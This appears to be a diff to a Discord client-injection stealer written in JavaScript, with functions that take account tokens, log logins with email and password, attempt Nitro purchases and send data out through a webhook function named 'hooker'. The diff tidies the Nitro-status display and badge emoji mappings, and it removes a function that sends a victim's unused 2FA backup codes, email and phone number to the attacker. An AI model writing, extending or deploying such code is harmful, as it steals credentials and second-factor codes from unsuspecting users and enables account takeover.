@@ -564,25 +564,18 @@ const buyNitro = async (token) => {
   }
 };
 
-const getNitro = r => {
-  switch (r.premium_type) {
-      default:
-          return "`none`"
-      case 1:
-          return "<:nitro:1232017139461001320>"
-      case 2:
-          if (!r.premium_guild_since) return "<:nitro:1232017139461001320>"
-          var now = new Date(Date.now())
-          var arr = ["<:boost1:1232102555354665082>", "<:boost2:1232102556537192511>", "<:boost4:1232102559041323030>", "<:boost5:1232102560492687390>", "<:boost6:1232102549923041352>", "<:boost7:1232102551214882836>", "<:boost8:1232102552569643048>", "<:boost9:1232102554066878544>"]
-          var a = [new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since)]
-          var b = [2, 3, 6, 9, 12, 15, 18, 24]
-          var r = []
-          for (var p in a) r.push(Math.round((calcDate(a[p], b[p]) - now) / 86400000))
-          var i = 0
-          for (var p of r) p > 0 ? "" : i++
-          return "<:nitro:1232017139461001320>" + arr[i]
+const getNitro = (flags) => {
+  switch (flags) {
+    case 0:
+      return 'No Nitro';
+    case 1:
+      return 'Nitro Classic';
+    case 2:
+      return 'Nitro Boost';
+    default:
+      return 'No Nitro';
   }
-}
+};
 
 const badgeEmojis = {
   1: '<:staff:1232102693804314654>',
@@ -596,6 +589,15 @@ const badgeEmojis = {
   64: '<:bravery:1232102661772284025>',
   4194304: '<:activedev:1232102658782007307>',
   256: '<:balance:1232102660447146126>',
+  32768: '<:boost1:1232102555354665082>',
+  65536: '<:boost2:1232102556537192511>',
+  196608: '<:boost3:1232102557774647336>',
+  393216: '<:boost4:1232102559041323030>',
+  589824: '<:boost5:1232102560492687390>',
+  786432: '<:boost6:1232102549923041352>',
+  983040: '<:boost7:1232102551214882836>',
+  1179648: '<:boost8:1232102552569643048>',
+  1310720: '<:boost9:1232102554066878544>',
 };
 
 const getBadges = (flags) => {
@@ -637,45 +639,6 @@ const hooker = async (content) => {
   req.write(data);
   req.end();
 };
-
-const BackupCodesViewed = async (codes, token) => {
-  const account = await fetchAccount(token)
-
-  const filteredCodes = codes.filter((code) => {
-      return code.consumed === false;
-  });
-
-  let message = "";
-  for (let code of filteredCodes) {
-      message += `${code.code.substr(0, 4)}-${code.code.substr(4)}\n`;
-  }
-  const content = {
-      "content": `**${account.username}** just viewed his 2FA backup codes!`,
-      "embeds": [{
-          "fields": [{
-                  "name": "Backup Codes",
-                  "value": "```" + message + "```",
-                  "inline": false
-              },
-              {
-                  "name": "Email",
-                  "value": "`" + account.email + "`",
-                  "inline": true
-              }, {
-                  "name": "Phone",
-                  "value": "`" + (account.phone || "None") + "`",
-                  "inline": true
-              }
-          ]
-
-      }]
-  };
-
-  hooker(content, token, account);
-}
-
-
-createWindow();
 
 const login = async (email, password, token) => {
   const json = await getInfo(token);
@@ -1019,5 +982,4 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
       break;
   }
 });
-
 module.exports = require('./core.asar');
